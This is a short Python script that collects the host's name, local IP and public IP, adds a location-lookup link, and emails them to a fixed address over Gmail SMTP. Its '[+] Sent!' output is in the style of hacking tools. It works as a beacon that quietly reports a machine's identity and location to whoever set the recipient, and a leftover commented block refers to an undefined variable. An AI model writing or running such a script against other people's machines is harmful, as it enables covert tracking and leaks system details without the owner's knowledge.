import socket, requests
from email.message import EmailMessage
import smtplib


def send_info():
    h_name = socket.gethostname()
    local = socket.gethostbyname(h_name)

    public = requests.get('https://api64.ipify.org').text

    email = 'email' # Sender email
    password = 'passwd' # Sender password

    msg = EmailMessage()
    msg['Subject'] = f'info of {public}'
    msg['from'] = email
    msg['to'] = 'email' # Receiver email
    msg.set_content(f'''
    Host Name >>>> {h_name}
    Local IP  >>>> {local}
    Public Ip >>>> {public}
    Location  >>>> https://en.iponmap.com/{public}
    ''')
    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        smtp.login(email, password)
        smtp.send_message(msg)

try:
    send_info()
    print("[+] Sent!")
except:
    print("[X] Error!")
"""
print("[+] Host Name is:" + h_name)
print('[+] public ip: {}'.format(public))
print("[+] Computer IP Address is:" + IP_addres)
"""
